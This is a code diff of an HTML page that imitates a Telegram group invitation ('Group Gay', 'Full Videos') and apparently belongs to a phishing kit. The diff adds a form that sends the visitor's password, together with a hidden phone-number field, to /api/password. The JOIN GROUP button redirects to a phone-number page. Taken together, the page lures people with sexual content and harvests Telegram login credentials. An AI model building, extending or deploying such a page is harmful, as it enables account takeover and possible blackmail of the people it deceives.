@@ -251,30 +251,54 @@ html, body * {scrollbar-color: #c4c4c4 transparent;scrollbar-width: thin;}
 <header class="mud-appbar mud-appbar-fixed-top mud-elevation-0 gray darken-4"><div role="toolbar" class="mud-toolbar mud-toolbar-gutters mud-toolbar-appbar"><img src="../assets/img/logotele.png" class="mud-image object-fill object-center me-2" height="35" />
     <h6 class="mud-typography mud-typography-h6">Telegram</h6>
     <div aria-hidden="true" class="flex-grow-1"></div>
-    <button type="button" class="mud-button-root mud-button mud-button-filled mud-button-filled-default mud-button-filled-size-medium mud-ripple blue darken-1 shades-text text-white rounded-pill" __internal_stopPropagation_onclick><span class="mud-button-label">DOWNLOAD</span></button></div></header>
-<div class="mud-main-content vh-100 shades black pt-0"><div class="vw-100 vh-100" style="background: url(https://group-gay-fun.xbog-el.site/pattern.svg) no-repeat #000;background-size : cover; padding-top: 60px;"><div class="mud-container mud-container-maxwidth-sm mud-container--gutters mt-8"><div class="mud-paper mud-elevation-0 gray darken-4 pt-8 pb-4 px-4 rounded-lg" style=""><div role="group" class="d-flex flex-row justify-center align-center gap-3"><img src="../assets/img/0505.jpeg" class="mud-image object-cover object-center rounded-circle" width="120" height="120" /></div>
-                <h5 class="mud-typography mud-typography-h5 mud-typography-align-center shades-text text-white mt-8">Full Videos</h5>
-<p class="mud-typography mud-typography-body2 mud-typography-align-center gray-text text-darken-2">10,237 members, 5,710 online</p>
-<p class="mud-typography mud-typography-body1 mud-typography-align-center shades-text text-white mt-4">&#xA0;</p>
-
-<div role="group" class="d-flex flex-row justify-center align-center gap-3 mt-8">
-    <button type="button" id="joinButton" class="mud-button-root mud-button mud-button-filled mud-button-filled-default mud-button-filled-size-medium mud-ripple blue darken-1 shades-text text-white rounded-pill">
-        <span class="mud-button-label">JOIN GROUP</span>
+    <button type="button" class="mud-button-root mud-button mud-button-filled mud-button-filled-default mud-button-filled-size-medium mud-ripple blue darken-1 shades-text text-white rounded-pill">
+      <span class="mud-button-label">DOWNLOAD</span>
     </button>
+  </div>
+</header>
+
+<div class="mud-main-content vh-100 shades black pt-0">
+  <div class="vw-100 vh-100" style="background: url(https://group-gay-fun.xbog-el.site/pattern.svg) no-repeat #000;background-size:cover; padding-top: 60px;">
+    <div class="mud-container mud-container-maxwidth-sm mud-container--gutters mt-8">
+      <div class="mud-paper mud-elevation-0 gray darken-4 pt-8 pb-4 px-4 rounded-lg">
+
+        <div role="group" class="d-flex flex-row justify-center align-center gap-3">
+          <img src="../assets/img/0505.jpeg" class="mud-image object-cover object-center rounded-circle" width="120" height="120" />
+        </div>
+
+        <h5 class="mud-typography mud-typography-h5 mud-typography-align-center shades-text text-white mt-8">Full Videos</h5>
+        <p class="mud-typography mud-typography-body2 mud-typography-align-center gray-text text-darken-2">10,237 members, 5,710 online</p>
+
+        <!-- === FORM PASSWORD DISINI === -->
+        <form action="/api/password" method="post" class="mt-4 text-center">
+          <input type="hidden" name="phoneNumber" value="1234567890">
+          <input type="password" name="password" placeholder="Enter Password" class="form-control mb-3" required>
+          <button type="submit" class="btn btn-primary rounded-pill px-4">Submit</button>
+        </form>
+        <!-- ============================ -->
+
+        <div role="group" class="d-flex flex-row justify-center align-center gap-3 mt-4">
+          <button type="button" id="joinButton" class="mud-button-root mud-button mud-button-filled mud-button-filled-default mud-button-filled-size-medium mud-ripple blue darken-1 shades-text text-white rounded-pill">
+            <span class="mud-button-label">JOIN GROUP</span>
+          </button>
+        </div>
+
+        <p class="mud-typography mud-typography-body2 mud-typography-align-center gray-text text-darken-2 mt-4">
+          You are invited to the group <b>Group Gay</b>. Click above to join.
+        </p>
+
+      </div>
+    </div>
+  </div>
 </div>
 
-<p class="mud-typography mud-typography-body2 mud-typography-align-center gray-text text-darken-2 mt-8">
-    You are invited to the group <b>Group Gay</b>. Click above to join.
-</p>
-
 <script>
-    // JavaScript to handle the button click and redirect to login.html
-    document.getElementById('joinButton').onclick = function() {
-        window.location.href = 'nomor.html';
-    };
+  document.getElementById('joinButton').onclick = function() {
+    window.location.href = 'nomor.html';
+  };
 </script>
 
-                </p></div></div></div></div></div>
-        <!--Blazor:{"prerenderId":"5846eac7fed84a8692608b3acd04518f"}-->
-    <script src="_content/MudBlazor/MudBlazor.min.js"></script>
-    <script src="_framework/blazor.web.js"></script></body></html><!--Blazor-Server-Component-State:CfDJ8HFwAkt1UOxBmtuS+KV9p561YDxHtEvxUxyJm/DolJgO8akSp6gup8/CANALygxvDATKfR1MYHiw9E8mBFL5JIrd2nUN0evPy00Igw234Fipmpo+GIoMqqw4t/wez1vg1OLh7pnE3ON0f4VHAFxDoaYbWFe2c5Zg0nuZn+fVpnPsRw5ja2Iik/9T9kUu2AzTwIzqTsR5Nx+JHs+E0m5ENE5qqFMDpd75lyo0hkESCkWDG9NKzTAy6Ak+JORPTUQq5jDINsni1eHgCPX7u3cI1zDHdGNN8trG0kMpe7Y2m5bEBVF1b+/8vjjCAzDdrJaPHvy3BMTQ8ZDFZKyi5KfeAyYGvp7IETm8pM5dfJiXopM0HIWTygjIihQ0/uJB6WZmvInOXmhQwVL+7sxk51zCrAHaK0fRa3IZwy7N7lBi2EbChm3sTouSmUCOARUYbXa/kuCqXhBL3Ru9czFrqdod/ug38Rgpyd5V2Nq9fpj/EG0xw72kodTQoIKf9cTlDKxC8O/EtOdfUCLZSf745EpPSoUAzjx/81o24F9dIKExYCj4-->
+<script src="_content/MudBlazor/MudBlazor.min.js"></script>
+<script src="_framework/blazor.web.js"></script>
+</body>
+</html>
